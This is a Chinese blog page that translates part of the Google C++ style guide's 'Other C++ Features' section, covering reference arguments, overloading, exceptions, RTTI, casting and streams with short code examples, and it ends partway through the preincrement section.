<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>#编码风格# #Google C&#43;&#43;# 其他C&#43;&#43;特性(OtherC&#43;&#43;Fetures) - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="#编码风格# #Google C&#43;&#43;# 其他C&#43;&#43;特性(OtherC&#43;&#43;Fetures)" />
<meta property="og:description" content="目录
引用参数（Reference Arguments）
函数重载(Function Overloading)
默认参数(Default Arguments)
可变长度数组和内存申请(Variable-Length Arrays and alloca())
友元(Friends)
异常处理(Excpetions)
运行时类型信息(Run-Time Type Information, RTTI)
类型转换(Casting)
流(Streams)
前置自增和前置自减(Preincrement and Predecrement)
const修饰符的使用(Use of const)
整型类型(Integer Types)
64位兼容性(64-bit Portability)
预处理宏(Preprocessor Macros)
0和空(0 and NULL)
存储容量运算符(sizeof)
增强库(Boost)
C&#43;&#43; 0x库
引用参数（Reference Arguments） 所有用引用传值的变量应该被const修饰。
定义：
在C语⾔言中，如果函数需要修改一个变量，必须使用指针作为其参数。比如int foo(int*pval)。但在C&#43;&#43;中，有了另一种方式，即引用：int foo(int &amp;val)。
利：把一个参数定义为引用可以避免丑陋的代码（比如*pval&#43;&#43;）。有些程序需要，比如复制构造函数。使程序更明确，不像指针能取得NULL值。弊：由于引用兼具值表达式和指针的主义，会引起迷惑。 结论：
所有函数引用参数都应该定义为const引用。
void Foo(const string &amp;in, string *out); 实际上，将值或者常引用作为输入参数而将指针作为输出参数是谷歌的一个惯例。输入参数也可以是常指针，但不允许非const(non-const)引用。将常指针作为输入参数的一种情况是，你想强调这个参数将不被复制，它在对象的整个⽣生命周期内必须存在，但最好在注释中说明。标准模板库的适配器（比如bind2nd和mem_fun）不允许引用参数，这时只有用指针了。
函数重载(Function Overloading) 看到一个函数的调用⽴立即能知道其操作而不是需要⾸首先找出是哪个重载版本被调用了时，才使用重载函数。
class MyClass{ Public: void Analyze(const string &amp;text); void Analyze(const char *text,size_t textlen); }; 定义：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/d18c3ac62a762a13ce18726a15b44a75/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-04-17T16:11:23+08:00" />
<meta property="article:modified_time" content="2019-04-17T16:11:23+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">#编码风格# #Google C&#43;&#43;# 其他C&#43;&#43;特性(OtherC&#43;&#43;Fetures)</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:80px;"> </p> 
<p id="%E5%BC%95%E7%94%A8%E5%8F%82%E6%95%B0%EF%BC%88Reference%20Arguments%EF%BC%89-toc" style="margin-left:80px;"><a href="#%E5%BC%95%E7%94%A8%E5%8F%82%E6%95%B0%EF%BC%88Reference%20Arguments%EF%BC%89" rel="nofollow">引用参数（Reference Arguments）</a></p> 
<p id="%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD(Function%20Overloading)-toc" style="margin-left:80px;"><a href="#%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD%28Function%20Overloading%29" rel="nofollow">函数重载(Function Overloading)</a></p> 
<p id="%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0(Default%20Arguments)-toc" style="margin-left:80px;"><a href="#%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0%28Default%20Arguments%29" rel="nofollow">默认参数(Default Arguments)</a></p> 
<p id="%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%A6%E6%95%B0%E7%BB%84%E5%92%8C%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7(Variable-Length%20Arrays%20and%20alloca())-toc" style="margin-left:80px;"><a href="#%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%A6%E6%95%B0%E7%BB%84%E5%92%8C%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%28Variable-Length%20Arrays%20and%20alloca%28%29%29" rel="nofollow">可变长度数组和内存申请(Variable-Length Arrays and alloca())</a></p> 
<p id="%E5%8F%8B%E5%85%83(Friends)-toc" style="margin-left:80px;"><a href="#%E5%8F%8B%E5%85%83%28Friends%29" rel="nofollow">友元(Friends)</a></p> 
<p id="%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86(Excpetions)-toc" style="margin-left:80px;"><a href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%28Excpetions%29" rel="nofollow">异常处理(Excpetions)</a></p> 
<p id="%E8%BF%90%E8%A1%8C%E6%97%B6%E7%B1%BB%E5%9E%8B%E4%BF%A1%E6%81%AF(Run-Time%20Type%20Information%2C%20RTTI)-toc" style="margin-left:80px;"><a href="#%E8%BF%90%E8%A1%8C%E6%97%B6%E7%B1%BB%E5%9E%8B%E4%BF%A1%E6%81%AF%28Run-Time%20Type%20Information%2C%20RTTI%29" rel="nofollow">运行时类型信息(Run-Time Type Information, RTTI)</a></p> 
<p id="%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2(Casting)-toc" style="margin-left:80px;"><a href="#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%28Casting%29" rel="nofollow">类型转换(Casting)</a></p> 
<p id="%E6%B5%81(Streams)-toc" style="margin-left:80px;"><a href="#%E6%B5%81%28Streams%29" rel="nofollow">流(Streams)</a></p> 
<p id="%E5%89%8D%E7%BD%AE%E8%87%AA%E5%A2%9E%E5%92%8C%E5%89%8D%E7%BD%AE%E8%87%AA%E5%87%8F(Preincrement%20and%20Predecrement)-toc" style="margin-left:80px;"><a href="#%E5%89%8D%E7%BD%AE%E8%87%AA%E5%A2%9E%E5%92%8C%E5%89%8D%E7%BD%AE%E8%87%AA%E5%87%8F%28Preincrement%20and%20Predecrement%29" rel="nofollow">前置自增和前置自减(Preincrement and Predecrement)</a></p> 
<p id="const%E4%BF%AE%E9%A5%B0%E7%AC%A6%E7%9A%84%E4%BD%BF%E7%94%A8(Use%20of%20const)-toc" style="margin-left:80px;"><a href="#const%E4%BF%AE%E9%A5%B0%E7%AC%A6%E7%9A%84%E4%BD%BF%E7%94%A8%28Use%20of%20const%29" rel="nofollow">const修饰符的使用(Use of const)</a></p> 
<p id="%E6%95%B4%E5%9E%8B%E7%B1%BB%E5%9E%8B(Integer%20Types)-toc" style="margin-left:80px;"><a href="#%E6%95%B4%E5%9E%8B%E7%B1%BB%E5%9E%8B%28Integer%20Types%29" rel="nofollow">整型类型(Integer Types)</a></p> 
<p id="64%E4%BD%8D%E5%85%BC%E5%AE%B9%E6%80%A7(64-bit%20Portability)-toc" style="margin-left:80px;"><a href="#64%E4%BD%8D%E5%85%BC%E5%AE%B9%E6%80%A7%2864-bit%20Portability%29" rel="nofollow">64位兼容性(64-bit Portability)</a></p> 
<p id="%E9%A2%84%E5%A4%84%E7%90%86%E5%AE%8F(Preprocessor%20Macros)-toc" style="margin-left:80px;"><a href="#%E9%A2%84%E5%A4%84%E7%90%86%E5%AE%8F%28Preprocessor%20Macros%29" rel="nofollow">预处理宏(Preprocessor Macros)</a></p> 
<p id="0%E5%92%8C%E7%A9%BA(0%20and%20NULL)-toc" style="margin-left:80px;"><a href="#0%E5%92%8C%E7%A9%BA%280%20and%20NULL%29" rel="nofollow">0和空(0 and NULL)</a></p> 
<p id="%E5%AD%98%E5%82%A8%E5%AE%B9%E9%87%8F%E8%BF%90%E7%AE%97%E7%AC%A6(sizeof)-toc" style="margin-left:80px;"><a href="#%E5%AD%98%E5%82%A8%E5%AE%B9%E9%87%8F%E8%BF%90%E7%AE%97%E7%AC%A6%28sizeof%29" rel="nofollow">存储容量运算符(sizeof)</a></p> 
<p id="%E5%A2%9E%E5%BC%BA%E5%BA%93(Boost)-toc" style="margin-left:80px;"><a href="#%E5%A2%9E%E5%BC%BA%E5%BA%93%28Boost%29" rel="nofollow">增强库(Boost)</a></p> 
<p id="C%2B%2B%200x%E5%BA%93-toc" style="margin-left:80px;"><a href="#C%2B%2B%200x%E5%BA%93" rel="nofollow">C++ 0x库</a></p> 
<hr id="hr-toc"> 
<h4 id="%E5%BC%95%E7%94%A8%E5%8F%82%E6%95%B0%EF%BC%88Reference%20Arguments%EF%BC%89" style="margin-left:0cm;"><span style="color:#000000;">引用参数（</span><span style="color:#000000;">Reference Arguments</span><span style="color:#000000;">）</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        所有用引用传值的变量应该被const</span><span style="color:#000000;">修饰。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        在C</span><span style="color:#000000;">语⾔言中，如果函数需要修改一个变量，必须使用指针作为其参数。比如</span><span style="color:#86ca5e;">int foo(int*pval)</span><span style="color:#000000;">。但在</span><span style="color:#000000;">C++</span><span style="color:#000000;">中，有了另一种方式，即引用：</span><span style="color:#86ca5e;">int foo(int &amp;val)</span><span style="color:#000000;">。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：把一个参数定义为引用可以避免丑陋的代码（比如*pval++）。有些程序需要，比如复制构造函数。使程序更明确，不像指针能取得NULL值。</span></li><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：由于引用兼具值表达式和指针的主义，会引起迷惑。</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        所有函数引用参数都应该定义为const</span><span style="color:#000000;">引用。</span></p> 
<pre class="has"><code>void Foo(const string &amp;in, string *out);</code></pre> 
<p style="margin-left:0cm;"><span style="color:#000000;">        实际上，将值或者常引用作为输入参数而将指针作为输出参数是谷歌的一个惯例。输入参数也可以是常指针，但不允许非</span><span style="color:#86ca5e;">const(non-const)</span><span style="color:#000000;">引用。将常指针作为输入参数的一种情况是，你想强调这个参数将不被复制，它在对象的整个⽣生命周期内必须存在，但最好在注释中说明。标准模板库的适配器（比如</span><span style="color:#000000;">bind2nd</span><span style="color:#000000;">和</span><span style="color:#000000;">mem_fun）不允许引用参数，这时只有用指针了。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD(Function%20Overloading)" style="margin-left:0cm;"><span style="color:#000000;">函数重载</span><span style="color:#000000;">(Function Overloading)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        看到一个函数的调用⽴立即能知道其操作而不是需要⾸首先找出是哪个重载版本被调用了时，才使用重载函数。</span></p> 
<pre class="has"><code>class MyClass{

Public:

    void Analyze(const string &amp;text);

    void Analyze(const char *text,size_t textlen);

};</code></pre> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        利用重载，你可以定义接收不同参数的同名函数，比如接收</span><span style="color:#86ca5e;">const string&amp;</span><span style="color:#000000;">和</span><span style="color:#86ca5e;">const char*</span><span style="color:#000000;">的同名函数。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：重载可以使代码更直观。对于模板化的代码，重载可能是必须的；对于访问控制器(Visitor)的实现，重载也是很方便的。</span></li><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：如果函数仅以参数类型不同来重载，读者可能需要深入理解C++复杂的参数匹配规则才能知道是怎么回事。在继承中，子类只重写基类函数的某些版本也会引起迷惑。</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        要想重载函数，考虑根据其参数来命名函数。比如</span><span style="color:#86ca5e;">AppendString()</span><span style="color:#000000;">、</span><span style="color:#86ca5e;">AppendInt()</span><span style="color:#000000;">就比</span><span style="color:#86ca5e;">Append()</span><span style="color:#000000;">好。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0(Default%20Arguments)" style="margin-left:0cm;"><span style="color:#000000;">默认参数</span><span style="color:#000000;">(Default Arguments)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        除非在以下情况下，不允许使用函数默认参数。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：你经常会写带有很多默认值的函数，但有时又不得不重载这些默认值。默认参数提供了实现它的简单方法，且不用为了少量例外而定义大量函数。</span></li><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：程序员常常通过查看已有代码来找出调用一个API的方法。默认参数将变得更难维护，因为从其他地方复制－粘贴代码，默认参数可能未被显⽰示。当默认参数不适用于新代码时，复制－粘贴部分将引起问题。</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        除了以下情况，函数必须明确定义每个参数来强制程序员在调用API时考虑传入参数值，而不是简单地接受默认参数。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        一种特殊的例外是当默认参数是用来模拟可变长参数时：</span></p> 
<pre class="has"><code>// 通过默认参数，最多⽀支持4个参数
string StrCat(const AlphaNum &amp;a,
    const AlphaNum &amp;b = gEmptyAlphaNum,
    const AlphaNum &amp;c = gEmptyAlphaNum,
    const AlphaNum &amp;d = gEmptyAlphaNum);</code></pre> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%A6%E6%95%B0%E7%BB%84%E5%92%8C%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7(Variable-Length%20Arrays%20and%20alloca())" style="margin-left:0cm;"><span style="color:#000000;">可变长度数组和内存申请</span><span style="color:#000000;">(Variable-Length Arrays and alloca())</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        不允许变长数组和内存申请。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#3399ea;">利：可变长度数组语句自然，且与alloca()一样，很高效。</span></li><li style="margin-left:0cm;"><span style="color:#3399ea;">弊：可变长度数组和alloc()不是C++标准的一部分。重要的是，它们根据程序栈容量来申请空间，这可能引起内存覆盖缺陷。“在我的机器上一切正常，但做成产品后却神秘死机。”</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">使用更安全的内存申请函数，比如</span><span style="color:#86ca5e;">scoped_ptr/scoped_array</span><span style="color:#000000;">。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E5%8F%8B%E5%85%83(Friends)" style="margin-left:0cm;"><span style="color:#000000;">友元</span><span style="color:#000000;">(Friends)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        适度使用友元类和友元函数是允许的。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        友元应该和其友类定义在同一个文件中，这样，读者不必再去另一个文件中查看友元使用了该类中的哪些私有成员。友元的一个常见作用是在不暴露一个类的内部细节时利用友元类来正确地构造其内部状态。比如</span><span style="color:#86ca5e;">FooBuilder</span><span style="color:#000000;">和</span><span style="color:#86ca5e;">Foo</span><span style="color:#000000;">。有时，将一个单元测试类定义为其测试类的友元会很有用。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        友元仅仅是扩展而不是打破类的封装性。当一个类需要访问另一个类的私有成员时，友元比将这个成员公有化更好。然而，类与类的协作只能通过公共成员。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86(Excpetions)" style="margin-left:0cm;"><span style="color:#000000;">异常处理</span><span style="color:#000000;">(Excpetions)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        通常不使用C++</span><span style="color:#000000;">的异常处理。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：</span></li></ul> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">    ● 异常处理使在程序的更高层次来处理多层函数嵌套调用的“不可发⽣生”错误成为可能，而且不需要使用隐蔽且容易出错的错误代码簿记；</span></p> 
<p style="text-indent:0px;"><span style="color:#7c79e5;">    ● 异常处理被大多数其他现代程序设计语⾔言采用。在C++中使用异常处理将使其与其他语⾔言如Python、Java保持一致性。</span></p> 
<p style="text-indent:0px;"><span style="color:#7c79e5;">    ● 一些第三方库使用异常处理，如果关闭，可能导致很验证使用这些API。</span></p> 
<p style="text-indent:0px;"><span style="color:#7c79e5;">    ● 异常是唯一能导致构造失败的方式。尽管可以使用工⼚厂函数或者Init()方法来实现构造，但它们分别需要堆申请和“无效”状态。</span></p> 
<p style="text-indent:0px;"><span style="color:#7c79e5;">    ● 异常处理常被用于架构测试。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：</span></li></ul> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">    ● 当给一个函数加上抛出(throw)语句时，必须检查其调用链。它们要么进行基本的异常处理，要么忽略异常且无视程序由此而终止运行。举个例子，如果f()调用g()，g()又调用f()，h抛出一个异常，f捕捉到了这个异常，那么g必须注意在异常发⽣生时的清理工作。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">    ● 更一般地，异常处理使程序很难从其代码中看出其控制流：程序可能从意想不到的地方返回。这将使维护和调试变得困难重重。你可以通过使用一些异常处理规则来减小这些开销，但一定比开发⼈人员需要了解和理解的多。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">    ● 异常安全性需要资源获取即初始化（RAII）和不同的编码实践的支持。为简化正确开发异常安全代码的工作，也需要很多支持机制。进一步，为避免陷入寻找完整函数调用链的⿇麻烦，异常安全代码必须把用于将状态持久化为“提交”阶段的逻辑进行隔离。这既有好处又有开销（也许在你被迫隐藏代码来隔离提交的地方）。允许异常处理，在不值得的情况下也得付出这些代价。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">    ● 使用异常处理将增加目标代码量，增加编译时间（通常不明显）并可能增大地址空间的压⼒力。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">    ● 异常的可用性可能使开发者在不合时宜时抛出异常或者从异常状态恢复并不安全时使用。比如，无效的用户输入不应该导致异常抛出。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">    </span><span style="color:#7c79e5;">    </span><span style="color:#000000;">表面上，使用异常处理的好处比开销多，尤其是新项目。然而，如果为已有代码引入异常处理，将会引起所有相关代码的变动。如果异常在新项目外可被抛出，则其与未进行异常处理的旧项目的互操作将变得困难重重。由于大多数谷歌的</span><span style="color:#000000;">C++项目都不准备采用异常处理机制，因而将很难使用产⽣生异常的新代码。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">        </span><span style="color:#000000;">考虑到谷歌已有代码未进行异常处理，异常处理的机制引入的花销将远大于新项目。而且，转换过程也将缓慢而且容易出错。再者，异常处理的替代方式，比如错误处理和断⾔言也不会增加很多编程负担。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">        </span><span style="color:#000000;">我们并不是站在哲学或者道德的立场反对使用异常处理机制，而是站在实用的立场上。因为我们需要使用谷歌开源项目，而且对这些项目引入异常处理很困难，我们不得不在谷歌开源项目中建议不要采用异常处理。如果从头开发这些项目将困难重重。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">        </span><span style="color:#000000;">对于Windows</span><span style="color:#000000;">代码来说例外。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E8%BF%90%E8%A1%8C%E6%97%B6%E7%B1%BB%E5%9E%8B%E4%BF%A1%E6%81%AF(Run-Time%20Type%20Information%2C%20RTTI)" style="margin-left:0cm;"><span style="color:#000000;">运行时类型信息</span><span style="color:#000000;">(Run-Time Type Information, RTTI)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">        </span><span style="color:#000000;">不建议使用RTTI</span><span style="color:#000000;">。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">        </span><span style="color:#000000;">RTTI允许程序员在运行时查看一个对象的类类型。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">利：在单元测试时会有用，比如进行工⼚厂类测试时，必须证实一个新创建对象是否是应有动态类型。测试之外罕见其用。</span></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">弊：运行时检查类型通常意味着类设计有问题。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">        </span><span style="color:#000000;">除了单元测试，不要使用RTTI。确实需要基于对象类型来完成不同的功能时，考虑替代方案。虚方法是使子类执行不同代码的⾸首选方案。这将使对象自己来完成自己特定的工作。如果这些工作位于项目的一些处理代码中，考虑双分派</span><span style="color:#000000;">(</span><span style="color:#86ca5e;">Double-Dispatch</span><span style="color:#000000;">)，比如访问器设计模式</span><span style="color:#000000;">(</span><span style="color:#ffbb66;">Visitor Design Pattern</span><span style="color:#000000;">)。这允许对象外的设施可以利用系统内建类型来决定一个类的类型。如果你不赞成这些观点，你可以使用</span><span style="color:#000000;">RTTI</span><span style="color:#000000;">。但请三思</span><span style="color:#000000;">☺</span><span style="color:#000000;">再三思。不要⼿手动 .现 .似</span><span style="color:#000000;">RTTI</span><span style="color:#000000;">的变通方案。反对</span><span style="color:#000000;">RTTI及其变通方案应用的观点就和反对用类型标签对类分层一样多。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2(Casting)" style="margin-left:0cm;"><span style="color:#000000;">类型转换</span><span style="color:#000000;">(Casting)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">        </span><span style="color:#000000;">在C++</span><span style="color:#000000;">中，需要类型转换时请使用</span><span style="color:#86ca5e;">static_cast&lt;&gt;()</span><span style="color:#000000;">，不要使用诸如</span><span style="color:#86ca5e;">int y = (int)x</span><span style="color:#000000;">和</span><span style="color:#86ca5e;">int y = int(x)</span><span style="color:#000000;">的其他形式。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#7c79e5;">        </span><span style="color:#000000;">C++提供了一种与</span><span style="color:#000000;">C</span><span style="color:#000000;">不同的因类型而异的类型转换操作。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：C语⾔言的问题是转换操作的⼆二义性：有时是转换(比如(int)3.5)，而有时却是cast(比如(int)”hello”))。C++的类型转换则不存在这个问题，而且，C++的类型转换是显式的和可追踪的。</span></li><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：语句繁琐。</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<ul><li style="margin-left:0cm;"><span style="color:#000000;">使用</span><span style="color:#86ca5e;">static_cast</span><span style="color:#000000;">进行</span><span style="color:#000000;">C</span><span style="color:#000000;">风格的值转换或者将子类指针提升为基本指针；</span></li><li style="margin-left:0cm;"><span style="color:#000000;">使用</span><span style="color:#86ca5e;">const_cast</span><span style="color:#000000;">去掉</span><span style="color:#86ca5e;">const</span><span style="color:#000000;">修饰（参见</span><span style="color:#86ca5e;">const</span><span style="color:#000000;">）；</span></li><li style="margin-left:0cm;"><span style="color:#000000;">使用</span><span style="color:#86ca5e;">reinterpret_cast</span><span style="color:#000000;">进行不安全的指针类型转换（比如转换到或者从整型指针和其他类型指针）。当你确定你的做法及其引用的问题时才进行这种操作；</span></li><li style="margin-left:0cm;"><span style="color:#000000;">除了在测试中，不要用</span><span style="color:#86ca5e;">dynamic_cast</span><span style="color:#000000;">。如果在单元测试之外需要使用这种方法来测试一个类的类型，通常意味着你的设计有问题。</span></li></ul> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E6%B5%81(Streams)" style="margin-left:0cm;"><span style="color:#000000;">流</span><span style="color:#000000;">(Streams)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        流只用于日志记录。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        流是C</span><span style="color:#000000;">中</span><span style="color:#000000;">printf()</span><span style="color:#000000;">和</span><span style="color:#000000;">scanf()</span><span style="color:#000000;">的替代实现。</span></p> 
<ul><li style="margin-left:0cm;"><span style="color:#7c79e5;">利：使用流，不需要关⼼心输出对象的类型，也不需要像C那样定义一大串格式符了。流的构造和析构函数会自动打开和关闭相关文件。</span></li><li style="margin-left:0cm;"><span style="color:#7c79e5;">弊：流不利于随机读取。一些格式（尤其字符串格式习惯用法：%.*s）也不像使用类似printf技巧那样方便。流也不支持有利于国际化的运算符重定序（比如%1s指令）。</span></li></ul> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">结论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        除非需要日志接口，否则不要使用流。使用类似printf的例程。关于流的争论很多，但正如我们一致强调的，不要使用流。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">扩展讨论：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        关于这些问题的争论此起彼伏，所以这⾥里我们深入讨论。重申一下唯一指南原则：我们希望确保每次对于特定类型的</span><span style="color:#000000;">I/O的代码都是一样的。为此，我们不允许使用者在使用流还是</span><span style="color:#000000;">printf</span><span style="color:#000000;">（加上读</span><span style="color:#000000;">/</span><span style="color:#000000;">写</span><span style="color:#000000;">/</span><span style="color:#000000;">等等）之间进行选择，我们的做法是确定一个（即</span><span style="color:#000000;">printf）。之所以日志例外，是出于历史原因考虑的，日志是一个很特殊的程序。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        流的支持者认为流是明智的选择，但并不是这样。他们指出的每一个优点，都有相应的缺点。最大的优点是，你根本不需要知道输出对象的类型。但仔细想想，你可能使用了错误类型，而编译器不会警报。在使用流时，很容易犯这种错误：</span></p> 
<pre class="has"><code>cout&lt;&lt;this; //打印地址
cout&lt;&lt;*this; //打印指针内容</code></pre> 
<p style="margin-left:0cm;"><span style="color:#000000;">        由于运算符</span><span style="color:#86ca5e;">&lt;&lt;</span><span style="color:#000000;">被重载，编译器将不会报错。这也是我们不提倡重载的原因。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        一些⼈人说printf</span><span style="color:#000000;">格式繁琐不易阅读，但流也好不到哪⾥里。</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        看看下面的两段代码，处理同一类型的数据。哪一个更简单呢？</span></p> 
<pre class="has"><code>cerr&lt;&lt;”Error connecting to ‘”&lt;&lt;foo-&gt;bar()-&gt;hostname.first
    &lt;&lt;”:”&lt;&lt;foo-&gt;bar-&gt;hostname.second&lt;&lt;”:”&lt;&lt;strerror(errno);</code></pre> 
<pre class="has"><code>Fprintf(stderr,”Error connecting to ‘%s:%u:%s”,
    foo-&gt;bar()-&gt;hostname.first,foo-&gt;bar()-&gt;hostname.xxx);</code></pre> 
<p style="margin-left:0cm;"><span style="color:#000000;">        等等你可能发现的其他问题。（你也许会争论，正确地封装更好。但如果它对一个模式正确，对另一个呢？再者，我们的目标是尽量简化一种语⾔言，而不是增加更多需要学习的机制。）</span></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        关于两者优缺点的争论还在继续，也找不到一种更合理的解决方案。尽管我们简单地规定了选择它们中的一种，但还是使用</span><span style="color:#86ca5e;">printf+read/write</span><span style="color:#000000;">的居多。</span></p> 
<p style="margin-left:0cm;"> </p> 
<h4 id="%E5%89%8D%E7%BD%AE%E8%87%AA%E5%A2%9E%E5%92%8C%E5%89%8D%E7%BD%AE%E8%87%AA%E5%87%8F(Preincrement%20and%20Predecrement)" style="margin-left:0cm;"><span style="color:#000000;">前置自增和前置自减</span><span style="color:#000000;">(Preincrement and Predecrement)</span></h4> 
<p style="margin-left:0cm;"><span style="color:#000000;">        在操作迭代器和模板对象的时候使用前置自增和前置自减。</span></p> 
<p style="margin-left:0cm;"><strong><span style="color:#000000;">定义：</span></strong></p> 
<p style="margin-left:0cm;"><span style="color:#000000;">        当一个变量自增(</span><span style="color:#86ca5e;">++i</span><span style="color:#000000;">或</span><span style="color:#86ca5e;">i--</span><span style="color:#000000;">)(</span><span style="color:#000000;">自减</span><span style="color:#000000;">(</span><span style="color:#86ca5e;">--i</span><span style="color:#000000;">或</span><span style="color:#86ca5e;">i--</span><span style="color:#000000;">)且不需要使用其值时，必须考虑是前置还是后置</span><span style="color:#86ca5e;">++/--</span><span style="color:#000000;">。</span></p> 
